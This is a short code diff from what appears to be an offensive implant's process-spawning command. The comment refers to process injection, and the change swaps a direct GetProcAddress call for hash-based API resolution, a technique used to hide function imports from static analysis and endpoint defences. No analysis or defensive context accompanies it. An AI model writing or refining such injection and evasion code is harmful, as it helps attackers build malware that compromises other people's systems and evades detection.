@@ -103,9 +103,9 @@ auto declfn starburst::cmd_spawn(
         // resume main thread so process stays alive after injection
         typedef DWORD ( WINAPI *fn_ResumeThread )( HANDLE );
         auto pResumeThread = reinterpret_cast<fn_ResumeThread>(
-            inst.kernel32.GetProcAddress(
-                (HMODULE)inst.kernel32.handle,
-                symbol<LPCSTR>( "ResumeThread" ) ) );
+            resolve::_api(
+                reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
+                expr::hash_string( "ResumeThread" ) ) );
         if ( pResumeThread ) {
             pResumeThread( pi.hThread );
         }
